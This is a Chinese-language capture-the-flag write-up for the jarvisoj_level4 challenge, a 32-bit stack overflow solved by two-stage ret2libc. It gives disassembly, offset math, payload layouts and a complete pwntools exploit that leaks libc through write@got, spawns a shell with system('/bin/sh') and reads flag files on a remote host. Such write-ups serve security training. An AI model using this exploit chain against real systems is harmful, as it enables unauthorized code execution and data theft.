# Speedrun：jarvisoj_level4

> 题型：ret2libc / 32 位 `read` 栈溢出  
> 目标：`write(1, write@got, 4)` leak libc，返回 `main`，二阶段 `system("/bin/sh")`  
> 关键：偏移 **140**；`write@plt=0x8048340`；`write@got=0x804A018`；`main=0x8048470`

---

## 0. 一句话结论

```text
vulnerable_function:
  char buf[0x88] @ ebp-0x88
  read(0, buf, 0x100)

  32 位：saved EIP 在 ebp+4
  offset = 0x88 + 4 = 0x8c = 140

Stage 1:
  write(1, write@got, 4)
  然后 return main

Stage 2:
  system("/bin/sh")

cdecl 参数布局：
  [140 A][write@plt][main][1][write@got][4]
  [140 A][system][dummy_ret][binsh]
```

这题没有 `system@plt`，但 `write` / `read` 都在，Partial RELRO 让 GOT 可读。是标准的“leak 一次，回 main，再打一次”的 ret2libc 模板。

---

## 1. 30 秒定性质

```bash
cd '/home/yfhd5/Pwn Writeups/ret2libc'

file jarvisoj_level4
checksec --file=jarvisoj_level4
nm -n jarvisoj_level4 | grep -E ' (main|vulnerable_function)$'
objdump -d -M intel jarvisoj_level4 | sed -n '/<vulnerable_function>:/,/^$/p'
objdump -d -M intel jarvisoj_level4 | sed -n '/<main>:/,/^$/p'
objdump -R jarvisoj_level4 | grep -E 'write|read'
objdump -s -j .rodata jarvisoj_level4
```

关键输出：

```text
ELF 32-bit LSB executable, Intel i386, dynamically linked, not stripped
Partial RELRO
No canary found
NX enabled
No PIE (0x8048000)
Not stripped

0804844b <vulnerable_function>
08048470 <main>

0804a018 R_386_JUMP_SLOT   write@GLIBC_2.0
```

读法：

| 观察 | 结论 |
| --- | --- |
| 32 位 i386 | 参数按 cdecl 放在栈上，每个 4 字节 |
| `read(0, buf, 0x100)`，buf 0x88 | 覆盖 saved EIP |
| No canary | 不需要 leak canary |
| No PIE | PLT / GOT / main 地址固定 |
| Partial RELRO | GOT 可读，能 leak `write` |
| 没有 `system@plt` | 必须 ret2libc，不能直接 ret2plt |
| 有 `write@plt` | 最干净的 leak 原语（输出原始 4 字节，不截断） |

### 1.1 `vulnerable_function`

```asm
0804844b <vulnerable_function>:
 804844b: push   ebp
 804844c: mov    ebp,esp
 804844e: sub    esp,0x88
 8048454: sub    esp,0x4
 8048457: push   0x100
 804845c: lea    eax,[ebp-0x88]
 8048462: push   eax
 8048463: push   0x0
 8048465: call   8048310 <read@plt>
 804846a: add    esp,0x10
 804846d: nop
 804846e: leave
 804846f: ret
```

等价 C：

```c
void vulnerable_function(void) {
    char buf[0x88];
    read(0, buf, 0x100);
}
```

栈布局：

```text
ebp-0x88 .. ebp-0x01 : buf[0x88]
ebp+0x00 .. ebp+0x03 : saved ebp
ebp+0x04 .. ebp+0x07 : saved EIP
```

```text
offset = 0x88 + 4 = 0x8c = 140
```

### 1.2 `main`

```asm
08048470 <main>:
 8048470: push   ebp
 8048471: mov    ebp,esp
 8048473: call   804844b <vulnerable_function>
 8048478: sub    esp,0xc
 804847b: push   0xd
 8048480: push   0x8048530            ; "Hello, World!\n"
 8048485: push   0x1
 804848a: call   8048340 <write@plt>
 804848f: add    esp,0x10
 8048492: mov    eax,0x0
 8048497: leave
 8048498: ret
```

关键点：`main` 只在 `vulnerable_function` 返回后打印 `Hello, World!\n`。  
所以 Stage 1 leak 完后如果返回 `main`，会再走一次同一个 `read`，可以发 Stage 2。

---

## 2. 地址与 gadget

```bash
objdump -d -M intel jarvisoj_level4 | grep -A4 '<write@plt>'
objdump -R jarvisoj_level4 | grep write
```

| 符号 | 地址 |
| --- | --- |
| `write@plt` | `0x8048340` |
| `write@got` | `0x804a018` |
| `main` | `0x8048470` |
| `vulnerable_function` | `0x804844b` |

32 位 cdecl 下调用：

```c
write(1, write@got, 4);
```

栈上依次是：

```text
[返回地址][arg1][arg2][arg3]
```

所以 Stage 1 的返回链是：

```text
write@plt
main          <- write 返回后回到 main
1             <- 第一个参数
write@got     <- buf
4             <- count
```

Stage 2：

```text
system
0xDEADBEEF    <- system 的假返回地址
binsh         <- system 的参数
```

`0xDEADBEEF` 只是占位；`system("/bin/sh")` 返回后进程会崩，不影响拿 shell。

---

## 3. Payload 布局

### 3.1 Stage 1

```text
[ 140 字节 'A' ]
[ write@plt 0x8048340 ]
[ main 0x8048470 ]
[ 1 ]
[ write@got 0x804a018 ]
[ 4 ]
```

```python
stage1 = flat(
    b"A" * OFFSET,
    WRITE_PLT, MAIN, 1, WRITE_GOT, 4,
)
```

### 3.2 Stage 2

```text
[ 140 字节 'A' ]
[ system ]
[ 0xDEADBEEF ]
[ binsh ]
```

```python
stage2 = flat(
    b"A" * OFFSET,
    system, 0xDEADBEEF, binsh,
)
```

### 3.3 libc base

```python
leak = u32(p.recvn(4))
libc_base = leak - libc.symbols["write"]

if libc_base & 0xFFF:
    raise SystemExit("[-] LIBC does not match the target")
```

`write` 输出的是原始 4 字节地址，没有 `puts` 的 `\x00` 截断问题，所以直接 `recvn(4)` 即可。

---

## 4. 完整 exp

```python
from pwn import *
import os
import re
import ssl
import time

context.arch = "i386"
context.log_level = "info"

BIN = "./jarvisoj_level4"
HOST = os.getenv("HOST", "")
PORT = int(os.getenv("PORT", "9999"))
LIBC_PATH = os.getenv("LIBC", "")

WRITE_PLT = 0x8048340
WRITE_GOT = 0x804A018
MAIN = 0x8048470

# vulnerable_function: char buf[0x88] @ ebp-0x88; saved EIP @ ebp+4
OFFSET = 0x88 + 4


def start():
    if args.LOCAL:
        ld = os.getenv("I386_LD")
        libpath = os.getenv("I386_LIBPATH")
        if ld:
            return process([ld, "--library-path", libpath, BIN])
        return process(BIN)

    if not HOST:
        raise SystemExit(
            "[-] set HOST/PORT, or run: python 10_jarvisoj_level4_exp.py LOCAL"
        )

    if os.getenv("SSL", "0") == "1":
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return remote(HOST, PORT, ssl=True, ssl_context=ctx, sni=HOST)

    return remote(HOST, PORT)


def resolve_libc():
    path = LIBC_PATH
    if not path and args.LOCAL:
        libpath = os.getenv("I386_LIBPATH", "")
        if libpath:
            path = os.path.join(libpath, "libc.so.6")

    if not path:
        raise SystemExit(
            "[-] set LIBC=/path/to/libc.so.6, or use I386_LIBPATH for LOCAL"
        )

    return ELF(path, checksec=False)


def exploit():
    p = start()
    libc = resolve_libc()

    # Stage 1: write(1, write@got, 4), then return to main for another read.
    stage1 = flat(
        b"A" * OFFSET,
        WRITE_PLT, MAIN, 1, WRITE_GOT, 4,
    )
    p.send(stage1)

    leak = u32(p.recvn(4))
    libc_base = leak - libc.symbols["write"]
    if libc_base & 0xFFF:
        raise SystemExit(
            f"[-] libc base {libc_base:#x} is not page aligned; "
            "LIBC does not match the target"
        )
    system = libc_base + libc.symbols["system"]
    binsh = libc_base + next(libc.search(b"/bin/sh\x00"))
    log.success(
        f"write = {leak:#x}, libc = {libc_base:#x}, system = {system:#x}"
    )

    # Stage 2: system("/bin/sh"); the dummy return keeps cdecl layout clear.
    stage2 = flat(
        b"A" * OFFSET,
        system, 0xDEADBEEF, binsh,
    )
    p.send(stage2)

    time.sleep(0.2)
    p.sendline(
        b"echo __PWNED__; cat flag* 2>/dev/null; cat /flag* 2>/dev/null; exit"
    )

    out = p.recvall(timeout=10).decode("utf-8", errors="ignore")
    print(out)

    flags = re.findall(r"(?:flag|CTF2|DASCTF)\{[^}]+\}", out, re.I)
    if flags:
        print(f"[+] GOT THE FLAG: {flags[0]}")
    else:
        print("[-] flag not found, raw output above")


if __name__ == "__main__":
    exploit()
```

### 本地验证（需要 i386 loader）

```bash
cd '/home/yfhd5/Pwn Writeups/ret2libc'
I386_LD=/tmp/libc32/root/usr/lib32/ld-linux.so.2 \
I386_LIBPATH=/tmp/libc32/root/usr/lib32 \
../.venv/bin/python 10_jarvisoj_level4_exp.py LOCAL
```

本机使用 `glibc 2.43` 的 32 位 libc 时：

```text
write = 0xf7e85560
libc  = 0xf7d66000
system = 0xf7db9cc0
__PWNED__
```

`I386_LIBPATH` 同时负责：
- 让动态 loader 找到 32 位 `libc.so.6`；
- 让 `resolve_libc()` 读取同一个 libc 的 `write` / `system` / `/bin/sh` 偏移。

远程指定附件 libc：

```bash
HOST=... PORT=... LIBC=./libc-2.23.so python 10_jarvisoj_level4_exp.py
```

---

## 5. 交互坑

1. **偏移是 140，不是 136**  
   `0x88` 是 buffer，后面还有 4 字节 saved ebp，再后面才是 saved EIP。

2. **32 位参数在栈上**  
   不要套 64 位的 `pop rdi; ret`；`write@plt` / `main` / 参数按 cdecl 顺序直接排列。

3. **Stage 1 必须回到 `main`**  
   只有回到 `main` 才会再次调用 `vulnerable_function`，否则没有第二次 `read`。

4. **leak 用 `recvn(4)`**  
   `write` 不会补 `\x00`，输出长度固定 4。  
   如果用 `recvline()`，地址里的 `\n` 会截断/污染。

5. **Stage 1 后程序会打印 `Hello, World!`**  
   这 13 字节在 leak 之后才到，不影响 `recvn(4)`；如果日志看起来混在一起，是正常的。

6. **libc base 页对齐检查**  
   `libc_base & 0xFFF != 0` 就是 libc 选错，不要继续打。

7. **远程 libc 可能不是本机 libc**  
   必须用题目附件或 libc.rip 识别；本机 `2.43` 只用于本地验证链条。

8. **`system` 的假返回地址**  
   32 位下 `system` 从栈上取参数，因此 `system` 后面要先放 4 字节 dummy，再放 `/bin/sh`。

9. **`send` 不要加换行**  
   `read` 按长度读，payload 末尾不需要 `\n`；多发的换行会留在下一次 `read` 里。

---

## 6. 2 分钟速通时间线

| 时间 | 动作 |
| --- | --- |
| 0:00–0:20 | `file` + `checksec`：32 位、No PIE、No canary、Partial RELRO |
| 0:20–0:40 | `objdump vulnerable_function`：`buf=ebp-0x88`，offset 140 |
| 0:40–1:00 | 找 `write@plt=0x8048340`、`write@got=0x804a018`、`main=0x8048470` |
| 1:00–1:20 | Stage 1：`write(1, write@got, 4)` → `main` |
| 1:20–1:40 | 算 libc base，Stage 2：`system("/bin/sh")` |
| 1:40–2:00 | 本地 i386 loader 验证 `__PWNED__`，再打远程 |

---

## 7. 题型识别卡

```text
32 位 + No canary + No PIE + Partial RELRO
+ read 栈溢出，buf = ebp-0x88
+ 没有 system@plt，但有 write@plt / write@got
= ret2libc：write leak -> return main -> system("/bin/sh")
```

一句话：**`0x88 + 4 = 140`；先 `write(1, write@got, 4)` 回 `main`，再 `system` + dummy + `/bin/sh`。**

